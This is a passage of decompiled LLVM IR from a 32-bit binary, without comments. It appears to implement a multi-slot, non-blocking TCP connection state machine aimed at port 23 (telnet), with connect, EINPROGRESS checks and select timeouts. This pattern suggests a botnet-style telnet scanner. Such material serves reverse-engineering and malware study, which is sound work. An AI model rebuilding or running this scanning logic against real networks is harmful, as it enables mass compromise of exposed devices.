  store i32 2, i32* %stack_var_-604, align 4
  %v2_804d8eb = call i32 @function_8052210(i16 23)
  %v2_804d8fa = ptrtoint i32* %stack_var_-604 to i32
  %v15_804d900 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804d900, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804d917 = call i32 @function_80529ba(i32 513)
  store i32 %v1_804d917, i32* %edx.global-to-local, align 4
  store i32 513, i32* %eax.global-to-local, align 4
  %v3_804d938 = inttoptr i32 %v1_804d917 to i8*
  %v4_804d938 = call i32 @function_8051e84(i8* %v3_804d938, i32 0, i32 513)
  %v0_804d95c = load i32, i32* @esp, align 4
  %v1_804d96e = add i32 %v0_804d95c, -14317
  %v2_804d971 = and i32 %v1_804d96e, -16
  store i32 2560, i32* %edx.global-to-local, align 4
  %v1_804d994 = inttoptr i32 %v2_804d971 to i8*
  store i32 %v2_804d971, i32* @edi, align 4
  %v1_804d999 = and i32 %v1_804d96e, -256
  store i32 %v1_804d999, i32* %eax.global-to-local, align 4
  %v5_804d99b = call i8* @_memset(i8* %v1_804d994, i32 %v1_804d999, i32 2560)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804d9fa = or i32 %v2_804d971, 9
  br label %dec_label_pc_804d9a6

dec_label_pc_804d9a6:                             ; preds = %dec_label_pc_804d8a5, %dec_label_pc_804d9a6
  %storemerge141 = phi i32 [ 0, %dec_label_pc_804d8a5 ], [ %v4_804da1f, %dec_label_pc_804d9a6 ]
  %v2_804d9ba = mul nuw nsw i32 %storemerge141, 28
  %v2_804d9bc = add i32 %v2_804d9ba, %v2_804d971
  store i32 %v2_804d9bc, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d9c4 = inttoptr i32 %v2_804d9bc to i32*
  store i32 0, i32* %v2_804d9c4, align 4
  %v0_804d9c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9c6 = add i32 %v0_804d9c6, 4
  store i32 %v1_804d9c6, i32* %eax.global-to-local, align 4
  %v0_804d9c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9c9 = inttoptr i32 %v1_804d9c6 to i32*
  store i32 %v0_804d9c9, i32* %v2_804d9c9, align 4
  %v0_804d9cb = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9cb = add i32 %v0_804d9cb, 4
  store i32 %v1_804d9cb, i32* %eax.global-to-local, align 4
  %v0_804d9ce = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9ce = inttoptr i32 %v1_804d9cb to i32*
  store i32 %v0_804d9ce, i32* %v2_804d9ce, align 4
  %v0_804d9d0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9d0 = add i32 %v0_804d9d0, 4
  store i32 %v1_804d9d0, i32* %eax.global-to-local, align 4
  %v0_804d9d3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9d3 = inttoptr i32 %v1_804d9d0 to i32*
  store i32 %v0_804d9d3, i32* %v2_804d9d3, align 4
  %v0_804d9d5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9d5 = add i32 %v0_804d9d5, 4
  store i32 %v1_804d9d5, i32* %eax.global-to-local, align 4
  %v0_804d9d8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9d8 = inttoptr i32 %v1_804d9d5 to i32*
  store i32 %v0_804d9d8, i32* %v2_804d9d8, align 4
  %v0_804d9da = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9da = add i32 %v0_804d9da, 4
  store i32 %v1_804d9da, i32* %eax.global-to-local, align 4
  %v0_804d9dd = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9dd = inttoptr i32 %v1_804d9da to i32*
  store i32 %v0_804d9dd, i32* %v2_804d9dd, align 4
  %v0_804d9df = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9df = add i32 %v0_804d9df, 4
  %v0_804d9e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9e2 = inttoptr i32 %v1_804d9df to i32*
  store i32 %v0_804d9e2, i32* %v2_804d9e2, align 4
  %v3_804d9fa = add i32 %v2_804d9fa, %v2_804d9ba
  %v4_804d9fa = inttoptr i32 %v3_804d9fa to i8*
  store i8 1, i8* %v4_804d9fa, align 1
  %v1_804da17 = add i32 %v2_804d9bc, 24
  store i32 %v1_804da17, i32* %edx.global-to-local, align 4
  %v2_804da1d = inttoptr i32 %v1_804da17 to i32*
  store i32 %v1_804d917, i32* %v2_804da1d, align 4
  %v4_804da1f = add nuw nsw i32 %storemerge141, 1
  store i32 %v4_804da1f, i32* %eax.global-to-local, align 4
  %v15_804da25 = icmp eq i32 %v4_804da1f, 512
  br i1 %v15_804da25, label %dec_label_pc_804da2e.preheader, label %dec_label_pc_804d9a6

dec_label_pc_804da2e.preheader:                   ; preds = %dec_label_pc_804d9a6
  %v2_804deac = ptrtoint i32* %stack_var_-320 to i32
  %tmp35 = bitcast i32* %stack_var_-320 to i8*
  %v2_804df2d = ptrtoint i32* %stack_var_-328 to i32
  %v2_804df93 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804df9d = ptrtoint i32* %stack_var_-192 to i32
  %v2_804da9e = or i32 %v2_804d971, 8
  %v2_804dbcf = or i32 %v2_804d971, 11
  %v2_804dc16 = or i32 %v2_804d971, 10
  %v2_804e7e9 = add i32 %v2_804d971, 16
  br label %dec_label_pc_804da2e

dec_label_pc_804da2e:                             ; preds = %dec_label_pc_804eb34, %dec_label_pc_804da2e.preheader
  %stack_var_-624.0 = phi i32 [ %tmp3, %dec_label_pc_804da2e.preheader ], [ %stack_var_-624.1, %dec_label_pc_804eb34 ]
  %stack_var_-628.0 = phi i32 [ %tmp, %dec_label_pc_804da2e.preheader ], [ %stack_var_-628.1, %dec_label_pc_804eb34 ]
  br label %dec_label_pc_804da3a

dec_label_pc_804da3a:                             ; preds = %dec_label_pc_804da2e, %dec_label_pc_804eb34
  %storemerge = phi i32 [ 0, %dec_label_pc_804da2e ], [ %v4_804eb34, %dec_label_pc_804eb34 ]
  %storemerge39 = phi i32 [ 0, %dec_label_pc_804da2e ], [ %v4_804eb34, %dec_label_pc_804eb34 ]
  %stack_var_-628.238 = phi i32 [ %stack_var_-628.0, %dec_label_pc_804da2e ], [ %stack_var_-628.1, %dec_label_pc_804eb34 ]
  %stack_var_-624.237 = phi i32 [ %stack_var_-624.0, %dec_label_pc_804da2e ], [ %stack_var_-624.1, %dec_label_pc_804eb34 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804da40 = mul nuw nsw i32 %storemerge39, 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  %v2_804da4e = mul nuw nsw i32 %storemerge39, 28
  %v2_804da50 = add i32 %v2_804da4e, %v2_804d971
  %v1_804da52 = add i32 %v2_804da50, 16
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  %v1_804da55 = inttoptr i32 %v1_804da52 to i32*
  %v2_804da55 = load i32, i32* %v1_804da55, align 4
  store i32 %v2_804da55, i32* %eax.global-to-local, align 4
  %v1_804da57 = icmp eq i32 %v2_804da55, 0
  %v1_804da59 = icmp eq i1 %v1_804da57, false
  br i1 %v1_804da59, label %dec_label_pc_804da88, label %dec_label_pc_804da5b

dec_label_pc_804da5b:                             ; preds = %dec_label_pc_804da3a
  store i32 %storemerge39, i32* @ebx, align 4
  %v0_804da5e = load i32, i32* @esp, align 4
  %v1_804da5e = inttoptr i32 %v0_804da5e to i32*
  store i32 0, i32* %v1_804da5e, align 4
  %v1_804da65 = inttoptr i32 %storemerge39 to i32*
  %v2_804da65 = call i32 @function_8050ed8(i32* %v1_804da65)
  store i32 %v2_804da65, i32* @esi, align 4
  %v0_804da6f = load i32, i32* @ebx, align 4
  %v1_804da71 = mul i32 %v0_804da6f, 4
  store i32 %v1_804da71, i32* %edx.global-to-local, align 4
  %v2_804da7f = mul i32 %v0_804da6f, 28
  %v2_804da81 = add i32 %v2_804da7f, %v2_804d971
  %v1_804da83 = add i32 %v2_804da81, 16
  store i32 %v1_804da83, i32* %eax.global-to-local, align 4
  %v2_804da86 = inttoptr i32 %v1_804da83 to i32*
  store i32 %v2_804da65, i32* %v2_804da86, align 4
  br label %dec_label_pc_804da88

dec_label_pc_804da88:                             ; preds = %dec_label_pc_804da3a, %dec_label_pc_804da5b
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804da9e = add i32 %v2_804da9e, %v2_804da4e
  %v4_804da9e = inttoptr i32 %v3_804da9e to i8*
  %v5_804da9e = load i8, i8* %v4_804da9e, align 4
  %v6_804da9e = zext i8 %v5_804da9e to i32
  store i32 %v6_804da9e, i32* %eax.global-to-local, align 4
  store i32 %v6_804da9e, i32* @edi, align 4
  %v1_804dabf = mul nuw nsw i32 %v6_804da9e, 4
  %v2_804dabf = add nuw nsw i32 %v1_804dabf, 134592696
  %v3_804dabf = inttoptr i32 %v2_804dabf to i32*
  %v4_804dabf = load i32, i32* %v3_804dabf, align 4
  store i32 %v4_804dabf, i32* %eax.global-to-local, align 4
  switch i8 %v5_804da9e, label %dec_label_pc_804eb34 [
    i8 0, label %dec_label_pc_804dac8
    i8 1, label %dec_label_pc_804dea2
    i8 2, label %dec_label_pc_804e217
    i8 3, label %dec_label_pc_804e34d
    i8 4, label %dec_label_pc_804e4bc
    i8 5, label %dec_label_pc_804e5f2
    i8 6, label %dec_label_pc_804e761
    i8 7, label %dec_label_pc_804e955
    i8 8, label %dec_label_pc_804e9ed
  ]

dec_label_pc_804dac8:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804dade = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804dade = inttoptr i32 %v3_804dade to i8*
  %v5_804dade = load i8, i8* %v4_804dade, align 1
  %v10_804dae3 = icmp eq i8 %v5_804dade, 1
  %v1_804dae5 = icmp eq i1 %v10_804dae3, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804dae5, label %dec_label_pc_804db94, label %dec_label_pc_804daeb

dec_label_pc_804daeb:                             ; preds = %dec_label_pc_804dac8
  %v1_804db03 = add i32 %v2_804da50, 24
  store i32 %v1_804db03, i32* %eax.global-to-local, align 4
  %v1_804db06 = inttoptr i32 %v1_804db03 to i32*
  %v2_804db06 = load i32, i32* %v1_804db06, align 4
  store i32 %v2_804da50, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804db29 = inttoptr i32 %v2_804da50 to i32*
  store i32 0, i32* %v2_804db29, align 4
  %v0_804db2b = load i32, i32* %eax.global-to-local, align 4
  %v1_804db2b = add i32 %v0_804db2b, 4
  store i32 %v1_804db2b, i32* %eax.global-to-local, align 4
  %v0_804db2e = load i32, i32* %edx.global-to-local, align 4
  %v2_804db2e = inttoptr i32 %v1_804db2b to i32*
  store i32 %v0_804db2e, i32* %v2_804db2e, align 4
  %v0_804db30 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db30 = add i32 %v0_804db30, 4
  store i32 %v1_804db30, i32* %eax.global-to-local, align 4
  %v0_804db33 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db33 = inttoptr i32 %v1_804db30 to i32*
  store i32 %v0_804db33, i32* %v2_804db33, align 4
  %v0_804db35 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db35 = add i32 %v0_804db35, 4
  store i32 %v1_804db35, i32* %eax.global-to-local, align 4
  %v0_804db38 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db38 = inttoptr i32 %v1_804db35 to i32*
  store i32 %v0_804db38, i32* %v2_804db38, align 4
  %v0_804db3a = load i32, i32* %eax.global-to-local, align 4
  %v1_804db3a = add i32 %v0_804db3a, 4
  store i32 %v1_804db3a, i32* %eax.global-to-local, align 4
  %v0_804db3d = load i32, i32* %edx.global-to-local, align 4
  %v2_804db3d = inttoptr i32 %v1_804db3a to i32*
  store i32 %v0_804db3d, i32* %v2_804db3d, align 4
  %v0_804db3f = load i32, i32* %eax.global-to-local, align 4
  %v1_804db3f = add i32 %v0_804db3f, 4
  store i32 %v1_804db3f, i32* %eax.global-to-local, align 4
  %v0_804db42 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db42 = inttoptr i32 %v1_804db3f to i32*
  store i32 %v0_804db42, i32* %v2_804db42, align 4
  %v0_804db44 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db44 = add i32 %v0_804db44, 4
  %v0_804db47 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db47 = inttoptr i32 %v1_804db44 to i32*
  store i32 %v0_804db47, i32* %v2_804db47, align 4
  store i32 %v1_804db03, i32* %edx.global-to-local, align 4
  store i32 %v2_804db06, i32* @eax, align 4
  store i32 %v2_804db06, i32* %v1_804db06, align 4
  store i32 %storemerge39, i32* @ebx, align 4
  %v1_804db6c = call i32 @function_8049f3f(i32 %v6_804da9e)
  %v0_804db76 = load i32, i32* @ebx, align 4
  %v1_804db78 = mul i32 %v0_804db76, 4
  store i32 %v1_804db78, i32* %edx.global-to-local, align 4
  %v2_804db86 = mul i32 %v0_804db76, 28
  %v2_804db88 = add i32 %v2_804db86, %v2_804d971
  %v1_804db8a = add i32 %v2_804db88, 4
  store i32 %v1_804db8a, i32* %eax.global-to-local, align 4
  %v2_804db8d = inttoptr i32 %v1_804db8a to i32*
  store i32 %v1_804db6c, i32* %v2_804db8d, align 4
  br label %dec_label_pc_804dcc3

dec_label_pc_804db94:                             ; preds = %dec_label_pc_804dac8
  %v5_804dbaa = load i8, i8* %v4_804dade, align 1
  %v6_804dbaa = zext i8 %v5_804dbaa to i32
  store i32 %v6_804dbaa, i32* %eax.global-to-local, align 4
  %v4_804dbaf = icmp eq i8 %v5_804dbaa, 0
  %v1_804dbb1 = icmp eq i1 %v4_804dbaf, false
  br i1 %v1_804dbb1, label %dec_label_pc_804dcc3, label %dec_label_pc_804dbb7

dec_label_pc_804dbb7:                             ; preds = %dec_label_pc_804db94
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804dbcf = add i32 %v2_804dbcf, %v2_804da4e
  %v4_804dbcf = inttoptr i32 %v3_804dbcf to i8*
  %v5_804dbcf = load i8, i8* %v4_804dbcf, align 1
  %v2_804dbd6 = add i8 %v5_804dbcf, 1
  store i8 %v2_804dbd6, i8* %v4_804dbcf, align 1
  store i32 %storemerge39, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804dc16 = add i32 %v2_804dc16, %v2_804da4e
  %v4_804dc16 = inttoptr i32 %v3_804dc16 to i8*
  %v5_804dc16 = load i8, i8* %v4_804dc16, align 2
  %v2_804dc1d = add i8 %v5_804dc16, 1
  store i8 %v2_804dc1d, i8* %v4_804dc16, align 2
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v5_804dc5b = load i8, i8* %v4_804dbcf, align 1
  %v10_804dc60 = icmp eq i8 %v5_804dc5b, 14
  %v1_804dc62 = icmp eq i1 %v10_804dc60, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc62, label %dec_label_pc_804dc84, label %dec_label_pc_804dc64

dec_label_pc_804dc64:                             ; preds = %dec_label_pc_804dbb7
  store i8 1, i8* %v4_804dade, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804dc84:                             ; preds = %dec_label_pc_804dbb7
  %v5_804dc9a = load i8, i8* %v4_804dc16, align 2
  %v6_804dc9a = zext i8 %v5_804dc9a to i32
  store i32 %v6_804dc9a, i32* %eax.global-to-local, align 4
  %v10_804dc9f = icmp eq i8 %v5_804dc9a, 14
  %v1_804dca1 = icmp eq i1 %v10_804dc9f, false
  br i1 %v1_804dca1, label %dec_label_pc_804dcc3, label %dec_label_pc_804dca3

dec_label_pc_804dca3:                             ; preds = %dec_label_pc_804dc84
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804dade, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804dcc3:                             ; preds = %dec_label_pc_804dc84, %dec_label_pc_804db94, %dec_label_pc_804daeb
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804dccc = load i32, i32* @esp, align 4
  %v1_804dccc = inttoptr i32 %v0_804dccc to i32*
  store i32 23, i32* %v1_804dccc, align 4
  %v0_804dcd3 = load i32, i32* %stack_var_-604, align 4
  %v1_804dcd3 = trunc i32 %v0_804dcd3 to i16
  %v2_804dcd3 = call i32 @function_8052210(i16 %v1_804dcd3)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  %v1_804dd10 = add i32 %v2_804da50, 4
  store i32 %v1_804dd10, i32* %eax.global-to-local, align 4
  %v1_804dd13 = inttoptr i32 %v1_804dd10 to i32*
  %v2_804dd13 = load i32, i32* %v1_804dd13, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  store i32 %storemerge39, i32* @ebx, align 4
  %v0_804dd1e = load i32, i32* @esp, align 4
  %v1_804dd1e = add i32 %v0_804dd1e, 8
  %v2_804dd1e = inttoptr i32 %v1_804dd1e to i32*
  store i32 0, i32* %v2_804dd1e, align 4
  %v0_804dd26 = load i32, i32* @esp, align 4
  %v1_804dd26 = add i32 %v0_804dd26, 4
  %v2_804dd26 = inttoptr i32 %v1_804dd26 to i32*
  store i32 1, i32* %v2_804dd26, align 4
  %v0_804dd2e = load i32, i32* @esp, align 4
  %v1_804dd2e = inttoptr i32 %v0_804dd2e to i32*
  store i32 2, i32* %v1_804dd2e, align 4
  %v2_804dd35 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804dcd3, 65536
  %v3_804dd35 = sdiv i32 %sext, 65536
  %v4_804dd35 = call i32 @function_805280c(i32 %v3_804dd35, i32 %v2_804dd13, i32 %v2_804dd35)
  store i32 %v4_804dd35, i32* @esi, align 4
  %v0_804dd3f = load i32, i32* @ebx, align 4
  %v2_804dd4f = mul i32 %v0_804dd3f, 28
  %v3_804dd51 = add i32 %v2_804dd4f, %v2_804d971
  %v4_804dd51 = inttoptr i32 %v3_804dd51 to i32*
  store i32 %v4_804dd35, i32* %v4_804dd51, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804dd6a = inttoptr i32 %v2_804da50 to i32*
  %v4_804dd6a = load i32, i32* %v3_804dd6a, align 4
  store i32 %v4_804dd6a, i32* %eax.global-to-local, align 4
  %v10_804dd6d = icmp eq i32 %v4_804dd6a, -1
  br i1 %v10_804dd6d, label %dec_label_pc_804eb34, label %dec_label_pc_804dd76

dec_label_pc_804dd76:                             ; preds = %dec_label_pc_804dcc3
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804dd8c = load i32, i32* %v3_804dd6a, align 4
  store i32 %v4_804dd8c, i32* %eax.global-to-local, align 4
  %v0_804dd8f = load i32, i32* @esp, align 4
  %v1_804dd8f = add i32 %v0_804dd8f, 8
  %v2_804dd8f = inttoptr i32 %v1_804dd8f to i32*
  store i32 0, i32* %v2_804dd8f, align 4
  %v0_804dd97 = load i32, i32* @esp, align 4
  %v1_804dd97 = add i32 %v0_804dd97, 4
  %v2_804dd97 = inttoptr i32 %v1_804dd97 to i32*
  store i32 3, i32* %v2_804dd97, align 4
  %v0_804dd9f = load i32, i32* %eax.global-to-local, align 4
  %v1_804dd9f = load i32, i32* @esp, align 4
  %v2_804dd9f = inttoptr i32 %v1_804dd9f to i32*
  store i32 %v0_804dd9f, i32* %v2_804dd9f, align 4
  %v1_804dda2 = load i32, i32* %stack_var_-596, align 4
  %v3_804dda2 = call i32 @function_8050a3c(i32 %v2_804dd13, i32 %v1_804dda2, i32 0)
  %v1_804dda9 = or i32 %v3_804dda2, 2048
  store i32 %v1_804dda9, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804ddc5 = load i32, i32* %v3_804dd6a, align 4
  store i32 %v4_804ddc5, i32* %eax.global-to-local, align 4
  %v1_804ddc8 = load i32, i32* @esp, align 4
  %v2_804ddc8 = add i32 %v1_804ddc8, 8
  %v3_804ddc8 = inttoptr i32 %v2_804ddc8 to i32*
  store i32 %v1_804dda9, i32* %v3_804ddc8, align 4
  %v0_804ddcc = load i32, i32* @esp, align 4
  %v1_804ddcc = add i32 %v0_804ddcc, 4
  %v2_804ddcc = inttoptr i32 %v1_804ddcc to i32*
  store i32 4, i32* %v2_804ddcc, align 4
  %v0_804ddd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddd4 = load i32, i32* @esp, align 4
  %v2_804ddd4 = inttoptr i32 %v1_804ddd4 to i32*
  store i32 %v0_804ddd4, i32* %v2_804ddd4, align 4
  %v1_804ddd7 = load i32, i32* %stack_var_-596, align 4
  %v3_804ddd7 = call i32 @function_8050a3c(i32 %v2_804dd13, i32 %v1_804ddd7, i32 0)
  store i32 %v2_804d8fa, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804ddf8 = load i32, i32* %v3_804dd6a, align 4
  store i32 %v4_804ddf8, i32* %eax.global-to-local, align 4
  %v0_804ddfb = load i32, i32* @esp, align 4
  %v1_804ddfb = add i32 %v0_804ddfb, 8
  %v2_804ddfb = inttoptr i32 %v1_804ddfb to i32*
  store i32 16, i32* %v2_804ddfb, align 4
  %v1_804de03 = load i32, i32* @esp, align 4
  %v2_804de03 = add i32 %v1_804de03, 4
  %v3_804de03 = inttoptr i32 %v2_804de03 to i32*
  store i32 %v2_804d8fa, i32* %v3_804de03, align 4
  %v0_804de07 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de07 = load i32, i32* @esp, align 4
  %v2_804de07 = inttoptr i32 %v1_804de07 to i32*
  store i32 %v0_804de07, i32* %v2_804de07, align 4
  %v1_804de0a = load i32, i32* %stack_var_-596, align 4
  %v3_804de0a = call i32 @function_8052690(i32 %v2_804dd13, i32 %v1_804de0a, i32 0)
  store i32 %v3_804de0a, i32* %eax.global-to-local, align 4
  %v10_804de0f = icmp eq i32 %v3_804de0a, -1
  %v1_804de12 = icmp eq i1 %v10_804de0f, false
  br i1 %v1_804de12, label %dec_label_pc_804de61, label %dec_label_pc_804de14

dec_label_pc_804de14:                             ; preds = %dec_label_pc_804dd76
  %v1_804de14 = call i32 @function_8050f90(i32 %v2_804dd13)
  store i32 %v1_804de14, i32* %eax.global-to-local, align 4
  %v1_804de19 = inttoptr i32 %v1_804de14 to i32*
  %v2_804de19 = load i32, i32* %v1_804de19, align 4
  store i32 %v2_804de19, i32* %eax.global-to-local, align 4
  %v9_804de1b = icmp eq i32 %v2_804de19, 115
  br i1 %v9_804de1b, label %dec_label_pc_804de61, label %dec_label_pc_804de20

dec_label_pc_804de20:                             ; preds = %dec_label_pc_804de14
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804de36 = load i32, i32* %v3_804dd6a, align 4
  store i32 %v4_804de36, i32* %eax.global-to-local, align 4
  %v1_804de39 = load i32, i32* @esp, align 4
  %v2_804de39 = inttoptr i32 %v1_804de39 to i32*
  store i32 %v4_804de36, i32* %v2_804de39, align 4
  %v1_804de3c = call i32 @function_804d879(i32 %v2_804dd13)
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804dade, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804de61:                             ; preds = %dec_label_pc_804de14, %dec_label_pc_804dd76
  store i8 1, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804da55, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804dea2:                             ; preds = %dec_label_pc_804da88
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804deac, i32* @edi, align 4
  %v5_804deb3 = call i8* @_memset(i8* %tmp35, i32 0, i32 32)
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804ded1 = inttoptr i32 %v2_804da50 to i32*
  %v4_804ded1 = load i32, i32* %v3_804ded1, align 4
  %v2_804ded6 = udiv i32 %v4_804ded1, 32
  store i32 %v2_804ded6, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804deef = load i32, i32* %v3_804ded1, align 4
  %v1_804def2 = urem i32 %v4_804deef, 32
  store i32 %v1_804def2, i32* %eax.global-to-local, align 4
  %v0_804def5 = load i32, i32* @ebp, align 4
  %v2_804def5 = mul nuw nsw i32 %v2_804ded6, 4
  %v3_804def5 = add nsw i32 %v2_804def5, -316
  %v4_804def5 = add i32 %v3_804def5, %v0_804def5
  %v5_804def5 = inttoptr i32 %v4_804def5 to i32*
  %v6_804def5 = load i32, i32* %v5_804def5, align 4
  %v9_804def5 = shl i32 1, %v1_804def2
  %v12_804def5 = or i32 %v6_804def5, %v9_804def5
  store i32 %v12_804def5, i32* %v5_804def5, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804df27 = load i32, i32* %v3_804ded1, align 4
  %v1_804df2a = add i32 %v4_804df27, 1
  store i32 %v1_804df2a, i32* %edx.global-to-local, align 4
  %v1_804df33 = load i32, i32* @esp, align 4
  %v2_804df33 = add i32 %v1_804df33, 16
  %v3_804df33 = inttoptr i32 %v2_804df33 to i32*
  store i32 %v2_804df2d, i32* %v3_804df33, align 4
  %v0_804df37 = load i32, i32* @esp, align 4
  %v1_804df37 = add i32 %v0_804df37, 12
  %v2_804df37 = inttoptr i32 %v1_804df37 to i32*
  store i32 0, i32* %v2_804df37, align 4
  store i32 %v2_804deac, i32* %eax.global-to-local, align 4
  %v1_804df45 = load i32, i32* @esp, align 4
  %v2_804df45 = add i32 %v1_804df45, 8
  %v3_804df45 = inttoptr i32 %v2_804df45 to i32*
  store i32 %v2_804deac, i32* %v3_804df45, align 4
  %v0_804df49 = load i32, i32* @esp, align 4
  %v1_804df49 = add i32 %v0_804df49, 4
  %v2_804df49 = inttoptr i32 %v1_804df49 to i32*
  store i32 0, i32* %v2_804df49, align 4
  %v0_804df51 = load i32, i32* %edx.global-to-local, align 4
  %v1_804df51 = load i32, i32* @esp, align 4
  %v2_804df51 = inttoptr i32 %v1_804df51 to i32*
  store i32 %v0_804df51, i32* %v2_804df51, align 4
  %v0_804df54 = load i32, i32* %stack_var_-328, align 4
  %v2_804df54 = load i32, i32* %stack_var_-320, align 4
  %v5_804df54 = call i32 @function_8050e18(i32 %v0_804df54, i32 10000, i32 %v2_804df54, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804df54, i32* %eax.global-to-local, align 4
  %v12_804df5c = icmp eq i32 %v5_804df54, 1
  %v1_804df60 = icmp eq i1 %v12_804df5c, false
  br i1 %v1_804df60, label %dec_label_pc_804e125, label %dec_label_pc_804df66

dec_label_pc_804df66:                             ; preds = %dec_label_pc_804dea2
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-192, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804df90 = load i32, i32* %v3_804ded1, align 4
  store i32 %v4_804df90, i32* %edx.global-to-local, align 4
  %v1_804df99 = load i32, i32* @esp, align 4
  %v2_804df99 = add i32 %v1_804df99, 16
  %v3_804df99 = inttoptr i32 %v2_804df99 to i32*
  store i32 %v2_804df93, i32* %v3_804df99, align 4
  store i32 %v2_804df9d, i32* %eax.global-to-local, align 4
  %v1_804dfa3 = load i32, i32* @esp, align 4
  %v2_804dfa3 = add i32 %v1_804dfa3, 12
  %v3_804dfa3 = inttoptr i32 %v2_804dfa3 to i32*
  store i32 %v2_804df9d, i32* %v3_804dfa3, align 4
  %v0_804dfa7 = load i32, i32* @esp, align 4
  %v1_804dfa7 = add i32 %v0_804dfa7, 8
  %v2_804dfa7 = inttoptr i32 %v1_804dfa7 to i32*
  store i32 4, i32* %v2_804dfa7, align 4
  %v0_804dfaf = load i32, i32* @esp, align 4
  %v1_804dfaf = add i32 %v0_804dfaf, 4
  %v2_804dfaf = inttoptr i32 %v1_804dfaf to i32*
  store i32 1, i32* %v2_804dfaf, align 4
  %v0_804dfb7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dfb7 = load i32, i32* @esp, align 4
  %v2_804dfb7 = inttoptr i32 %v1_804dfb7 to i32*
  store i32 %v0_804dfb7, i32* %v2_804dfb7, align 4
  %v0_804dfba = load i32, i32* %stack_var_-332, align 4
  %v1_804dfba = load i32, i32* %stack_var_-328, align 4
